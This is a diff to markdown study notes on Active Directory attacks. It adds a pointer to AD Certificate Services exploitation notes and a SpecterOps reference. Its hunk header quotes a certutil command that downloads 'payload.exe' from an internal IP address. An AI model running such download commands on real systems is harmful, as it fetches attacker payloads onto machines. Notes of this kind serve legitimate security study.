@@ -115,9 +115,18 @@ certutil -urlcache -f http://10.10.3.45/payload.exe payload.exe
 
 ---
 
+## Kerberos Delegation & Certificate Services
+
+For detailed notes on Kerberos delegation attacks and AD Certificate Services (AD CS) exploitation, see:
+
+- [`ad-certificate-services.md`](ad-certificate-services.md) — Complete AD CS fundamentals, attack scenarios, and exploitation techniques
+
+---
+
 ## References
 
 - [Professor Messer - Active Directory Fundamentals](https://www.youtube.com/watch?v=GuWMKVTMD7k)
 - [Microsoft: Windows Setup Automation & Answer Files](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11)
 - [Microsoft: Windows Setup Answer File Search Order](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-automation-overview?view=windows-11#implicit-answer-file-search-order)
 - [MITRE ATT&CK T1037: Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037/)
+- [SpecterOps: Certified Pre-Owned](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
